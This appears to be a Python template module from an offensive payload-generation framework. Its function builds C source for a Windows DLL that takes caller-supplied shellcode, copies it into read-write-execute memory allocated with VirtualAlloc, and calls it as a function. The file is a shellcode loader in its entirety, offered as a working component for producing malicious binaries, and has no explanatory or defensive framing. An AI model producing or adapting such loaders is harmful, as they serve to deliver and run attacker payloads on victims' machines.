from ClassCongregation import BinaryDataTypeConversion
import random
__heading__="C-DLL-Windows-Null-Yes-MemoryEnforcement-20210901-15/72"
__build__=""
__language__=".c"
__process__=".dll"

def main(**kwargs):
    Shellcode=kwargs.get("shellcode")
    Include=kwargs.get("include")
    AllCode=kwargs.get("all_code")
    AllFunctionName = kwargs.get("all_function_name")
    Code = """
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char buf[] = \""""+Shellcode+"""\";

int add()

{
    LPVOID Memory;

    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();
    return 0;

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""
    return Code

